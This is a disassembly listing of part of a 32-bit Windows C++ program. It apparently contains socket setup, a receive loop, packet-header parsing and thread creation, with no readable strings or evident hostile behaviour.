  401ee6:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401ee9:	8b f4                	mov    %esp,%esi
  401eeb:	68 f0 51 41 00       	push   $0x4151f0
  401ef0:	57                   	push   %edi
  401ef1:	68 dc 05 41 00       	push   $0x4105dc
  401ef6:	50                   	push   %eax
  401ef7:	e8 1e dd 00 00       	call   0x40fc1a
  401efc:	83 c4 0c             	add    $0xc,%esp
  401eff:	50                   	push   %eax
  401f00:	56                   	push   %esi
  401f01:	e8 0e dd 00 00       	call   0x40fc14
  401f06:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401f09:	83 c4 0c             	add    $0xc,%esp
  401f0c:	e8 87 02 00 00       	call   0x402198
  401f11:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401f14:	ff 15 54 02 41 00    	call   *0x410254
  401f1a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  401f1d:	ff 15 54 02 41 00    	call   *0x410254
  401f23:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  401f26:	e8 11 fc ff ff       	call   0x401b3c
  401f2b:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  401f2e:	ff 15 54 02 41 00    	call   *0x410254
  401f34:	5f                   	pop    %edi
  401f35:	33 c0                	xor    %eax,%eax
  401f37:	5e                   	pop    %esi
  401f38:	c9                   	leave
  401f39:	c3                   	ret
  401f3a:	b8 a0 ff 40 00       	mov    $0x40ffa0,%eax
  401f3f:	e8 9a dd 00 00       	call   0x40fcde
  401f44:	81 ec 84 00 00 00    	sub    $0x84,%esp
  401f4a:	53                   	push   %ebx
  401f4b:	56                   	push   %esi
  401f4c:	57                   	push   %edi
  401f4d:	89 65 f0             	mov    %esp,-0x10(%ebp)
  401f50:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401f54:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  401f58:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401f5b:	50                   	push   %eax
  401f5c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401f5f:	50                   	push   %eax
  401f60:	ff 75 0c             	push   0xc(%ebp)
  401f63:	ff 15 4c 52 41 00    	call   *0x41524c
  401f69:	83 c4 0c             	add    $0xc,%esp
  401f6c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401f6f:	50                   	push   %eax
  401f70:	ff 75 d8             	push   -0x28(%ebp)
  401f73:	ff 75 ec             	push   -0x14(%ebp)
  401f76:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401f79:	ff 15 70 02 41 00    	call   *0x410270
  401f7f:	ff 75 ec             	push   -0x14(%ebp)
  401f82:	ff 15 50 52 41 00    	call   *0x415250
  401f88:	83 ec 0c             	sub    $0xc,%esp
  401f8b:	8b fc                	mov    %esp,%edi
  401f8d:	68 f0 51 41 00       	push   $0x4151f0
  401f92:	be 68 52 41 00       	mov    $0x415268,%esi
  401f97:	56                   	push   %esi
  401f98:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401f9b:	50                   	push   %eax
  401f9c:	56                   	push   %esi
  401f9d:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401fa0:	ff 15 90 02 41 00    	call   *0x410290
  401fa6:	50                   	push   %eax
  401fa7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401faa:	50                   	push   %eax
  401fab:	e8 85 cd 00 00       	call   0x40ed35
  401fb0:	59                   	pop    %ecx
  401fb1:	59                   	pop    %ecx
  401fb2:	50                   	push   %eax
  401fb3:	56                   	push   %esi
  401fb4:	68 54 06 41 00       	push   $0x410654
  401fb9:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401fbc:	50                   	push   %eax
  401fbd:	e8 58 dc 00 00       	call   0x40fc1a
  401fc2:	83 c4 0c             	add    $0xc,%esp
  401fc5:	50                   	push   %eax
  401fc6:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401fc9:	50                   	push   %eax
  401fca:	e8 45 dc 00 00       	call   0x40fc14
  401fcf:	83 c4 0c             	add    $0xc,%esp
  401fd2:	50                   	push   %eax
  401fd3:	8d 45 90             	lea    -0x70(%ebp),%eax
  401fd6:	50                   	push   %eax
  401fd7:	e8 38 dc 00 00       	call   0x40fc14
  401fdc:	83 c4 0c             	add    $0xc,%esp
  401fdf:	50                   	push   %eax
  401fe0:	8d 45 80             	lea    -0x80(%ebp),%eax
  401fe3:	50                   	push   %eax
  401fe4:	e8 2b dc 00 00       	call   0x40fc14
  401fe9:	83 c4 0c             	add    $0xc,%esp
  401fec:	50                   	push   %eax
  401fed:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  401ff3:	50                   	push   %eax
  401ff4:	e8 1b dc 00 00       	call   0x40fc14
  401ff9:	83 c4 0c             	add    $0xc,%esp
  401ffc:	50                   	push   %eax
  401ffd:	57                   	push   %edi
  401ffe:	e8 11 dc 00 00       	call   0x40fc14
  402003:	83 c4 0c             	add    $0xc,%esp
  402006:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402009:	e8 8a 01 00 00       	call   0x402198
  40200e:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  402014:	ff 15 54 02 41 00    	call   *0x410254
  40201a:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40201d:	ff 15 54 02 41 00    	call   *0x410254
  402023:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  402026:	ff 15 54 02 41 00    	call   *0x410254
  40202c:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40202f:	ff 15 54 02 41 00    	call   *0x410254
  402035:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  402038:	ff 15 54 02 41 00    	call   *0x410254
  40203e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  402041:	ff 15 54 02 41 00    	call   *0x410254
  402047:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40204a:	ff 15 54 02 41 00    	call   *0x410254
  402050:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  402054:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402057:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40205e:	5f                   	pop    %edi
  40205f:	5e                   	pop    %esi
  402060:	5b                   	pop    %ebx
  402061:	c9                   	leave
  402062:	c3                   	ret
  402063:	b8 50 20 40 00       	mov    $0x402050,%eax
  402068:	c3                   	ret
  402069:	e8 05 00 00 00       	call   0x402073
  40206e:	e9 12 00 00 00       	jmp    0x402085
  402073:	68 60 06 41 00       	push   $0x410660
  402078:	68 68 52 41 00       	push   $0x415268
  40207d:	e8 c9 ce 00 00       	call   0x40ef4b
  402082:	59                   	pop    %ecx
  402083:	59                   	pop    %ecx
  402084:	c3                   	ret
  402085:	68 91 20 40 00       	push   $0x402091
  40208a:	e8 2b dc 00 00       	call   0x40fcba
  40208f:	59                   	pop    %ecx
  402090:	c3                   	ret
  402091:	b9 68 52 41 00       	mov    $0x415268,%ecx
  402096:	ff 25 54 02 41 00    	jmp    *0x410254
  40209c:	e8 05 00 00 00       	call   0x4020a6
  4020a1:	e9 15 00 00 00       	jmp    0x4020bb
  4020a6:	55                   	push   %ebp
  4020a7:	8b ec                	mov    %esp,%ebp
  4020a9:	51                   	push   %ecx
  4020aa:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4020ad:	b9 58 52 41 00       	mov    $0x415258,%ecx
  4020b2:	50                   	push   %eax
  4020b3:	ff 15 50 02 41 00    	call   *0x410250
  4020b9:	c9                   	leave
  4020ba:	c3                   	ret
  4020bb:	68 c7 20 40 00       	push   $0x4020c7
  4020c0:	e8 f5 db 00 00       	call   0x40fcba
  4020c5:	59                   	pop    %ecx
  4020c6:	c3                   	ret
  4020c7:	b9 58 52 41 00       	mov    $0x415258,%ecx
  4020cc:	ff 25 54 02 41 00    	jmp    *0x410254
  4020d2:	e9 00 00 00 00       	jmp    0x4020d7
  4020d7:	b9 88 52 41 00       	mov    $0x415288,%ecx
  4020dc:	e9 22 08 00 00       	jmp    0x402903
  4020e1:	55                   	push   %ebp
  4020e2:	8b ec                	mov    %esp,%ebp
  4020e4:	51                   	push   %ecx
  4020e5:	56                   	push   %esi
  4020e6:	8b f1                	mov    %ecx,%esi
  4020e8:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4020eb:	50                   	push   %eax
  4020ec:	8d 4e 18             	lea    0x18(%esi),%ecx
  4020ef:	ff 15 50 02 41 00    	call   *0x410250
  4020f5:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  4020f9:	74 07                	je     0x402102
  4020fb:	8b ce                	mov    %esi,%ecx
  4020fd:	e8 07 00 00 00       	call   0x402109
  402102:	8b c6                	mov    %esi,%eax
  402104:	5e                   	pop    %esi
  402105:	c9                   	leave
  402106:	c2 04 00             	ret    $0x4
  402109:	80 3d 94 56 41 00 00 	cmpb   $0x0,0x415694
  402110:	56                   	push   %esi
  402111:	8b f1                	mov    %ecx,%esi
  402113:	75 05                	jne    0x40211a
  402115:	e8 27 00 00 00       	call   0x402141
  40211a:	6a 06                	push   $0x6
  40211c:	6a 01                	push   $0x1
  40211e:	6a 00                	push   $0x0
  402120:	e8 01 de 00 00       	call   0x40ff26
  402125:	83 f8 ff             	cmp    $0xffffffff,%eax
  402128:	89 06                	mov    %eax,(%esi)
  40212a:	75 04                	jne    0x402130
  40212c:	32 c0                	xor    %al,%al
  40212e:	5e                   	pop    %esi
  40212f:	c3                   	ret
  402130:	80 66 34 00          	andb   $0x0,0x34(%esi)
  402134:	80 66 35 00          	andb   $0x0,0x35(%esi)
  402138:	c7 46 30 e8 03 00 00 	movl   $0x3e8,0x30(%esi)
  40213f:	5e                   	pop    %esi
  402140:	c3                   	ret
  402141:	55                   	push   %ebp
  402142:	8b ec                	mov    %esp,%ebp
  402144:	81 ec 90 01 00 00    	sub    $0x190,%esp
  40214a:	8d 85 70 fe ff ff    	lea    -0x190(%ebp),%eax
  402150:	50                   	push   %eax
  402151:	68 02 02 00 00       	push   $0x202
  402156:	e8 d1 dd 00 00       	call   0x40ff2c
  40215b:	f7 d8                	neg    %eax
  40215d:	1a c0                	sbb    %al,%al
  40215f:	fe c0                	inc    %al
  402161:	a2 94 56 41 00       	mov    %al,0x415694
  402166:	c9                   	leave
  402167:	c3                   	ret
  402168:	55                   	push   %ebp
  402169:	8b ec                	mov    %esp,%ebp
  40216b:	56                   	push   %esi
  40216c:	8d 41 04             	lea    0x4(%ecx),%eax
  40216f:	57                   	push   %edi
  402170:	8d 75 08             	lea    0x8(%ebp),%esi
  402173:	8b f8                	mov    %eax,%edi
  402175:	6a 10                	push   $0x10
  402177:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402178:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402179:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40217a:	50                   	push   %eax
  40217b:	ff 31                	push   (%ecx)
  40217d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40217e:	e8 b5 dd 00 00       	call   0x40ff38
  402183:	5f                   	pop    %edi
  402184:	5e                   	pop    %esi
  402185:	85 c0                	test   %eax,%eax
  402187:	75 04                	jne    0x40218d
  402189:	b0 01                	mov    $0x1,%al
  40218b:	eb 07                	jmp    0x402194
  40218d:	e8 a0 dd 00 00       	call   0x40ff32
  402192:	32 c0                	xor    %al,%al
  402194:	5d                   	pop    %ebp
  402195:	c2 10 00             	ret    $0x10
  402198:	55                   	push   %ebp
  402199:	8b ec                	mov    %esp,%ebp
  40219b:	56                   	push   %esi
  40219c:	8d 45 08             	lea    0x8(%ebp),%eax
  40219f:	ff 31                	push   (%ecx)
  4021a1:	83 ec 10             	sub    $0x10,%esp
  4021a4:	8b cc                	mov    %esp,%ecx
  4021a6:	50                   	push   %eax
  4021a7:	ff 15 60 02 41 00    	call   *0x410260
  4021ad:	e8 52 03 00 00       	call   0x402504
  4021b2:	83 c4 14             	add    $0x14,%esp
  4021b5:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4021b8:	8b f0                	mov    %eax,%esi
  4021ba:	ff 15 54 02 41 00    	call   *0x410254
  4021c0:	8b c6                	mov    %esi,%eax
  4021c2:	5e                   	pop    %esi
  4021c3:	5d                   	pop    %ebp
  4021c4:	c2 10 00             	ret    $0x10
  4021c7:	56                   	push   %esi
  4021c8:	8b f1                	mov    %ecx,%esi
  4021ca:	ff 36                	push   (%esi)
  4021cc:	e8 4f dd 00 00       	call   0x40ff20
  4021d1:	83 26 00             	andl   $0x0,(%esi)
  4021d4:	5e                   	pop    %esi
  4021d5:	c3                   	ret
  4021d6:	56                   	push   %esi
  4021d7:	8b f1                	mov    %ecx,%esi
  4021d9:	ff 36                	push   (%esi)
  4021db:	e8 40 dd 00 00       	call   0x40ff20
  4021e0:	8d 4e 18             	lea    0x18(%esi),%ecx
  4021e3:	ff 15 54 02 41 00    	call   *0x410254
  4021e9:	5e                   	pop    %esi
  4021ea:	c3                   	ret
  4021eb:	55                   	push   %ebp
  4021ec:	8b ec                	mov    %esp,%ebp
  4021ee:	8b 45 08             	mov    0x8(%ebp),%eax
  4021f1:	89 41 14             	mov    %eax,0x14(%ecx)
  4021f4:	33 c0                	xor    %eax,%eax
  4021f6:	50                   	push   %eax
  4021f7:	50                   	push   %eax
  4021f8:	51                   	push   %ecx
  4021f9:	68 0a 22 40 00       	push   $0x40220a
  4021fe:	50                   	push   %eax
  4021ff:	50                   	push   %eax
  402200:	ff 15 98 01 41 00    	call   *0x410198
  402206:	5d                   	pop    %ebp
  402207:	c2 04 00             	ret    $0x4
  40220a:	55                   	push   %ebp
  40220b:	8b ec                	mov    %esp,%ebp
  40220d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402210:	6a 00                	push   $0x0
  402212:	ff 71 14             	push   0x14(%ecx)
  402215:	e8 02 00 00 00       	call   0x40221c
  40221a:	5d                   	pop    %ebp
  40221b:	c3                   	ret
  40221c:	55                   	push   %ebp
  40221d:	8b ec                	mov    %esp,%ebp
  40221f:	83 ec 34             	sub    $0x34,%esp
  402222:	53                   	push   %ebx
  402223:	56                   	push   %esi
  402224:	8b f1                	mov    %ecx,%esi
  402226:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402229:	57                   	push   %edi
  40222a:	50                   	push   %eax
  40222b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40222e:	ff 15 50 02 41 00    	call   *0x410250
  402234:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402237:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40223a:	50                   	push   %eax
  40223b:	ff 15 50 02 41 00    	call   *0x410250
  402241:	83 66 2c 00          	andl   $0x0,0x2c(%esi)
  402245:	ff 76 30             	push   0x30(%esi)
  402248:	ff 15 7c 03 41 00    	call   *0x41037c
  40224e:	59                   	pop    %ecx
  40224f:	8b d8                	mov    %eax,%ebx
  402251:	6a 00                	push   $0x0
  402253:	ff 76 30             	push   0x30(%esi)
  402256:	53                   	push   %ebx
  402257:	ff 36                	push   (%esi)
  402259:	e8 e0 dc 00 00       	call   0x40ff3e
  40225e:	8b f8                	mov    %eax,%edi
  402260:	85 ff                	test   %edi,%edi
  402262:	7e 49                	jle    0x4022ad
  402264:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402267:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40226a:	50                   	push   %eax
  40226b:	57                   	push   %edi
  40226c:	53                   	push   %ebx
  40226d:	ff 15 70 02 41 00    	call   *0x410270
  402273:	50                   	push   %eax
  402274:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402277:	ff 15 64 02 41 00    	call   *0x410264
  40227d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  402280:	ff 15 54 02 41 00    	call   *0x410254
  402286:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402289:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40228c:	50                   	push   %eax
  40228d:	ff 15 94 02 41 00    	call   *0x410294
  402293:	29 7e 2c             	sub    %edi,0x2c(%esi)
  402296:	83 7e 2c 00          	cmpl   $0x0,0x2c(%esi)
  40229a:	7f 11                	jg     0x4022ad
  40229c:	ff 75 0c             	push   0xc(%ebp)
  40229f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4022a2:	8b ce                	mov    %esi,%ecx
  4022a4:	ff 75 08             	push   0x8(%ebp)
  4022a7:	50                   	push   %eax
  4022a8:	e8 3d 00 00 00       	call   0x4022ea
  4022ad:	53                   	push   %ebx
  4022ae:	ff 15 80 03 41 00    	call   *0x410380
  4022b4:	85 ff                	test   %edi,%edi
  4022b6:	59                   	pop    %ecx
  4022b7:	7f 8c                	jg     0x402245
  4022b9:	8b ce                	mov    %esi,%ecx
  4022bb:	e8 26 00 00 00       	call   0x4022e6
  4022c0:	84 c0                	test   %al,%al
  4022c2:	74 09                	je     0x4022cd
  4022c4:	6a 01                	push   $0x1
  4022c6:	8b ce                	mov    %esi,%ecx
  4022c8:	e8 c4 04 00 00       	call   0x402791
  4022cd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4022d0:	ff 15 54 02 41 00    	call   *0x410254
  4022d6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4022d9:	ff 15 54 02 41 00    	call   *0x410254
  4022df:	5f                   	pop    %edi
  4022e0:	5e                   	pop    %esi
  4022e1:	5b                   	pop    %ebx
  4022e2:	c9                   	leave
  4022e3:	c2 08 00             	ret    $0x8
  4022e6:	8a 41 34             	mov    0x34(%ecx),%al
  4022e9:	c3                   	ret
  4022ea:	55                   	push   %ebp
  4022eb:	8b ec                	mov    %esp,%ebp
  4022ed:	83 ec 58             	sub    $0x58,%esp
  4022f0:	53                   	push   %ebx
  4022f1:	56                   	push   %esi
  4022f2:	8b f1                	mov    %ecx,%esi
  4022f4:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4022f7:	57                   	push   %edi
  4022f8:	50                   	push   %eax
  4022f9:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4022fc:	ff 15 50 02 41 00    	call   *0x410250
  402302:	33 db                	xor    %ebx,%ebx
  402304:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  402307:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40230a:	68 68 06 41 00       	push   $0x410668
  40230f:	68 58 52 41 00       	push   $0x415258
  402314:	ff 15 a4 02 41 00    	call   *0x4102a4
  40231a:	59                   	pop    %ecx
  40231b:	84 c0                	test   %al,%al
  40231d:	59                   	pop    %ecx
  40231e:	74 37                	je     0x402357
  402320:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402323:	ff 15 90 02 41 00    	call   *0x410290
  402329:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40232c:	50                   	push   %eax
  40232d:	ff 15 34 02 41 00    	call   *0x410234
  402333:	50                   	push   %eax
  402334:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402337:	50                   	push   %eax
  402338:	b9 88 52 41 00       	mov    $0x415288,%ecx
  40233d:	e8 e8 06 00 00       	call   0x402a2a
  402342:	50                   	push   %eax
  402343:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402346:	ff 15 64 02 41 00    	call   *0x410264
  40234c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40234f:	ff 15 54 02 41 00    	call   *0x410254
  402355:	eb 0c                	jmp    0x402363
  402357:	ff 75 08             	push   0x8(%ebp)
  40235a:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40235d:	ff 15 64 02 41 00    	call   *0x410264
  402363:	8d 46 30             	lea    0x30(%esi),%eax
  402366:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402369:	50                   	push   %eax
  40236a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40236d:	50                   	push   %eax
  40236e:	ff 15 58 02 41 00    	call   *0x410258
  402374:	50                   	push   %eax
  402375:	e8 3a 01 00 00       	call   0x4024b4
  40237a:	83 c4 0c             	add    $0xc,%esp
  40237d:	84 c0                	test   %al,%al
  40237f:	0f 84 1f 01 00 00    	je     0x4024a4
  402385:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402388:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40238b:	8d 78 0f             	lea    0xf(%eax),%edi
  40238e:	ff 15 a0 02 41 00    	call   *0x4102a0
  402394:	3b f8                	cmp    %eax,%edi
  402396:	0f 87 fa 00 00 00    	ja     0x402496
  40239c:	68 68 06 41 00       	push   $0x410668
  4023a1:	68 58 52 41 00       	push   $0x415258
  4023a6:	ff 15 a4 02 41 00    	call   *0x4102a4
  4023ac:	59                   	pop    %ecx
  4023ad:	84 c0                	test   %al,%al
  4023af:	59                   	pop    %ecx
  4023b0:	75 0c                	jne    0x4023be
  4023b2:	ff 75 08             	push   0x8(%ebp)
  4023b5:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023b8:	ff 15 64 02 41 00    	call   *0x410264
  4023be:	a1 9c 02 41 00       	mov    0x41029c,%eax
  4023c3:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023c6:	ff 30                	push   (%eax)
  4023c8:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4023cb:	6a 0f                	push   $0xf
  4023cd:	50                   	push   %eax
  4023ce:	ff 15 98 02 41 00    	call   *0x410298
  4023d4:	50                   	push   %eax
  4023d5:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023d8:	ff 15 64 02 41 00    	call   *0x410264
  4023de:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4023e1:	ff 15 54 02 41 00    	call   *0x410254
  4023e7:	ff 75 f8             	push   -0x8(%ebp)
  4023ea:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4023ed:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023f0:	53                   	push   %ebx
  4023f1:	50                   	push   %eax
  4023f2:	ff 15 98 02 41 00    	call   *0x410298
  4023f8:	50                   	push   %eax
  4023f9:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023fc:	ff 15 64 02 41 00    	call   *0x410264
  402402:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402405:	ff 15 54 02 41 00    	call   *0x410254
  40240b:	38 5d 10             	cmp    %bl,0x10(%ebp)
  40240e:	75 18                	jne    0x402428
  402410:	83 ec 10             	sub    $0x10,%esp
  402413:	8d 45 e8             	lea    -0x18(%ebp),%eax
  402416:	8b cc                	mov    %esp,%ecx
  402418:	50                   	push   %eax
  402419:	ff 15 60 02 41 00    	call   *0x410260
  40241f:	56                   	push   %esi
  402420:	ff 55 0c             	call   *0xc(%ebp)
  402423:	83 c4 14             	add    $0x14,%esp
  402426:	eb 34                	jmp    0x40245c
  402428:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40242b:	8d 4e 18             	lea    0x18(%esi),%ecx
  40242e:	50                   	push   %eax
  40242f:	ff 15 64 02 41 00    	call   *0x410264
  402435:	53                   	push   %ebx
  402436:	53                   	push   %ebx
  402437:	6a 01                	push   $0x1
  402439:	53                   	push   %ebx
  40243a:	ff 15 7c 01 41 00    	call   *0x41017c
  402440:	53                   	push   %ebx
  402441:	53                   	push   %ebx
  402442:	56                   	push   %esi
  402443:	89 46 28             	mov    %eax,0x28(%esi)
  402446:	ff 75 0c             	push   0xc(%ebp)
  402449:	53                   	push   %ebx
  40244a:	53                   	push   %ebx
  40244b:	ff 15 98 01 41 00    	call   *0x410198
  402451:	6a ff                	push   $0xffffffff
  402453:	ff 76 28             	push   0x28(%esi)
  402456:	ff 15 80 01 41 00    	call   *0x410180
  40245c:	a1 9c 02 41 00       	mov    0x41029c,%eax
  402461:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402464:	ff 30                	push   (%eax)
  402466:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402469:	57                   	push   %edi
  40246a:	50                   	push   %eax
  40246b:	ff 15 98 02 41 00    	call   *0x410298
  402471:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402474:	50                   	push   %eax
  402475:	ff 15 64 02 41 00    	call   *0x410264
  40247b:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40247e:	ff 15 54 02 41 00    	call   *0x410254
  402484:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402487:	ff 15 a0 02 41 00    	call   *0x4102a0
  40248d:	85 c0                	test   %eax,%eax
  40248f:	74 13                	je     0x4024a4
  402491:	e9 74 fe ff ff       	jmp    0x40230a
  402496:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402499:	ff 15 a0 02 41 00    	call   *0x4102a0
  40249f:	2b f8                	sub    %eax,%edi
  4024a1:	89 7e 2c             	mov    %edi,0x2c(%esi)
  4024a4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4024a7:	ff 15 54 02 41 00    	call   *0x410254
  4024ad:	5f                   	pop    %edi
  4024ae:	5e                   	pop    %esi
  4024af:	5b                   	pop    %ebx
  4024b0:	c9                   	leave
  4024b1:	c2 0c 00             	ret    $0xc
  4024b4:	55                   	push   %ebp
  4024b5:	8b ec                	mov    %esp,%ebp
  4024b7:	56                   	push   %esi
  4024b8:	8b 75 08             	mov    0x8(%ebp),%esi
  4024bb:	6a 0b                	push   $0xb
  4024bd:	56                   	push   %esi
  4024be:	68 6c 06 41 00       	push   $0x41066c
  4024c3:	ff 15 78 03 41 00    	call   *0x410378
  4024c9:	83 c4 0c             	add    $0xc,%esp
  4024cc:	85 c0                	test   %eax,%eax
  4024ce:	75 2f                	jne    0x4024ff
  4024d0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4024d3:	8b 46 0b             	mov    0xb(%esi),%eax
  4024d6:	57                   	push   %edi
  4024d7:	89 01                	mov    %eax,(%ecx)
  4024d9:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4024dc:	8d 78 0f             	lea    0xf(%eax),%edi
  4024df:	8b 11                	mov    (%ecx),%edx
  4024e1:	8d 34 12             	lea    (%edx,%edx,1),%esi
  4024e4:	3b fe                	cmp    %esi,%edi
  4024e6:	5f                   	pop    %edi
  4024e7:	76 12                	jbe    0x4024fb
  4024e9:	2b c2                	sub    %edx,%eax
  4024eb:	ba e8 fd 00 00       	mov    $0xfde8,%edx
  4024f0:	83 c0 0f             	add    $0xf,%eax
  4024f3:	3b c2                	cmp    %edx,%eax
  4024f5:	89 01                	mov    %eax,(%ecx)
  4024f7:	76 02                	jbe    0x4024fb
  4024f9:	89 11                	mov    %edx,(%ecx)
  4024fb:	b0 01                	mov    $0x1,%al
  4024fd:	eb 02                	jmp    0x402501
  4024ff:	32 c0                	xor    %al,%al
  402501:	5e                   	pop    %esi
  402502:	5d                   	pop    %ebp
  402503:	c3                   	ret
  402504:	55                   	push   %ebp
  402505:	8b ec                	mov    %esp,%ebp
  402507:	83 ec 24             	sub    $0x24,%esp
  40250a:	56                   	push   %esi
  40250b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40250e:	ff 15 a0 02 41 00    	call   *0x4102a0
  402514:	8b f0                	mov    %eax,%esi
  402516:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402519:	50                   	push   %eax
  40251a:	68 78 06 41 00       	push   $0x410678
  40251f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402522:	ff 15 4c 02 41 00    	call   *0x41024c
  402528:	6a 0b                	push   $0xb
  40252a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40252d:	ff 15 ac 02 41 00    	call   *0x4102ac
  402533:	89 30                	mov    %esi,(%eax)
  402535:	8d 45 08             	lea    0x8(%ebp),%eax
  402538:	50                   	push   %eax
  402539:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40253c:	50                   	push   %eax
  40253d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402540:	50                   	push   %eax
  402541:	e8 ce d6 00 00       	call   0x40fc14
  402546:	83 c4 0c             	add    $0xc,%esp
  402549:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40254c:	50                   	push   %eax
  40254d:	ff 15 64 02 41 00    	call   *0x410264
  402553:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402556:	ff 15 54 02 41 00    	call   *0x410254
  40255c:	b9 58 52 41 00       	mov    $0x415258,%ecx
  402561:	ff 15 a8 02 41 00    	call   *0x4102a8
  402567:	84 c0                	test   %al,%al
  402569:	74 22                	je     0x40258d
  40256b:	6a 00                	push   $0x0
  40256d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402570:	ff 15 a0 02 41 00    	call   *0x4102a0
  402576:	50                   	push   %eax
  402577:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40257a:	ff 15 34 02 41 00    	call   *0x410234
  402580:	50                   	push   %eax
  402581:	ff 75 18             	push   0x18(%ebp)
  402584:	e8 bb d9 00 00       	call   0x40ff44
  402589:	8b f0                	mov    %eax,%esi
  40258b:	eb 4b                	jmp    0x4025d8
  40258d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402590:	ff 15 a0 02 41 00    	call   *0x4102a0
  402596:	50                   	push   %eax
  402597:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40259a:	ff 15 34 02 41 00    	call   *0x410234
  4025a0:	50                   	push   %eax
  4025a1:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4025a4:	50                   	push   %eax
  4025a5:	b9 88 52 41 00       	mov    $0x415288,%ecx
  4025aa:	e8 7b 04 00 00       	call   0x402a2a
  4025af:	6a 00                	push   $0x0
  4025b1:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025b4:	ff 15 a0 02 41 00    	call   *0x4102a0
  4025ba:	50                   	push   %eax
  4025bb:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4025be:	ff 15 58 02 41 00    	call   *0x410258
  4025c4:	50                   	push   %eax
  4025c5:	ff 75 18             	push   0x18(%ebp)
  4025c8:	e8 77 d9 00 00       	call   0x40ff44
